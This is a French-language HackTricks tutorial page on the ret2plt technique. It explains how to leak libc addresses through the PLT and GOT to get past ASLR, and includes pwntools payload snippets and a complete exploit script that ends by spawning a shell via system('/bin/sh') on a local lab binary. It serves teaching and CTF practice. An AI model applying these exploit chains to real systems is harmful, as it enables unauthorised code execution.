# Ret2plt

{{#include ../../../banners/hacktricks-training.md}}

## Informations de base

L'objectif de cette technique est de **leak une adresse d'une fonction du PLT** afin de contourner ASLR. En effet, si, par exemple, vous leakez l'adresse de la fonction `puts` de la libc, vous pouvez ensuite **calculer la base de `libc`** et déterminer les offsets pour accéder à d'autres fonctions telles que **`system`**.

Cela peut être fait avec un payload `pwntools` tel que ([**from here**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt_and_got)):
```python
# 32-bit ret2plt
payload = flat(
b'A' * padding,
elf.plt['puts'],
elf.symbols['main'],
elf.got['puts']
)

# 64-bit
payload = flat(
b'A' * padding,
POP_RDI,
elf.got['puts']
elf.plt['puts'],
elf.symbols['main']
)
```
Remarquez comment **`puts`** (en utilisant l'adresse depuis le PLT) est appelé avec l'adresse de `puts` située dans le GOT (Global Offset Table). Ceci s'explique par le fait qu'au moment où `puts` affiche l'entrée GOT de puts, cette **entrée contiendra l'adresse exacte de `puts` en mémoire**.

Notez aussi comment l'adresse de `main` est utilisée dans l'exploit afin que lorsque `puts` termine son exécution, le **binary appelle `main` à nouveau au lieu de se terminer** (ainsi l'adresse leak restera valable).

> [!CAUTION]
> Notez que pour que cela fonctionne, le **binary ne peut pas être compilé avec PIE** ou vous devez avoir **trouvé un leak pour bypasser PIE** afin de connaître l'adresse du PLT, GOT et main. Sinon, vous devez d'abord bypasser PIE.

Vous pouvez trouver un [**exemple complet de ce bypass ici**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/ret2plt-aslr-bypass). Ceci était l'exploit final de cet **exemple**:

<details>
<summary>Full exploit example (ret2plt leak + system)</summary>
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvline()

payload = flat(
'A' * 32,
elf.plt['puts'],
elf.sym['main'],
elf.got['puts']
)

p.sendline(payload)

puts_leak = u32(p.recv(4))
p.recvlines(2)

libc.address = puts_leak - libc.sym['puts']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
libc.sym['exit'],
next(libc.search(b'/bin/sh\x00'))
)

p.sendline(payload)

p.interactive()
```
</details>

## Considérations modernes

- **`-fno-plt` builds** (courant dans les distributions modernes) remplacent `call foo@plt` par `call [foo@got]`. Si le binaire n'a pas de stub `foo@plt`, vous pouvez toujours leak l'adresse résolue avec `puts(elf.got['foo'])` puis **retourner directement à l'entrée GOT** (`flat(padding, elf.got['foo'])`) pour sauter dans libc une fois le lazy binding terminé.
- **Full RELRO / `-Wl,-z,now`** : la GOT est en lecture seule mais ret2plt fonctionne toujours pour les leaks car vous ne faites que lire la case GOT. Si le symbole n'a jamais été appelé, votre premier ret2plt effectuera aussi le lazy binding puis imprimera la case résolue.
- **ASLR + PIE** : si PIE est activé, leakez d'abord un pointeur de code (par ex. adresse de retour sauvegardée, pointeur de fonction, ou une entrée `.plt` via un autre format‑string/infoleak) pour calculer la base PIE, puis construisez la chaîne ret2plt avec les adresses PLT/GOT rebased.
- **Architectures non‑x86 avec BTI/PAC (AArch64)** : les entrées PLT sont des BTI landing pads valides (`bti c`), donc lors d'un exploit sur des binaires avec BTI activé, préférez sauter dans le stub PLT (ou un autre gadget annoté BTI) plutôt que directement dans un gadget libc sans BTI, sinon le CPU lèvera des échecs `BRK`/`PAC`.
- **Quick resolution helper** : si la fonction cible n'est pas encore résolue et que vous avez besoin d'un leak en une seule fois, enchaînez l'appel PLT deux fois : d'abord `elf.plt['foo']` (pour résoudre) puis à nouveau `elf.plt['foo']` avec l'adresse GOT en argument pour imprimer la case désormais remplie.

## Autres exemples & références

- [https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html)
- 64 bit, ASLR enabled but no PIE, the first step is to fill an overflow until the byte 0x00 of the canary to then call puts and leak it. With the canary a ROP gadget is created to call puts to leak the address of puts from the GOT and the a ROP gadget to call `system('/bin/sh')`
- [https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html)
- 64 bits, ASLR enabled, no canary, stack overflow in main from a child function. ROP gadget to call puts to leak the address of puts from the GOT and then call an one gadget.

## Références

- [MaskRay – All about Procedure Linkage Table](https://maskray.me/blog/2021-09-19-all-about-procedure-linkage-table)

{{#include ../../../banners/hacktricks-training.md}}
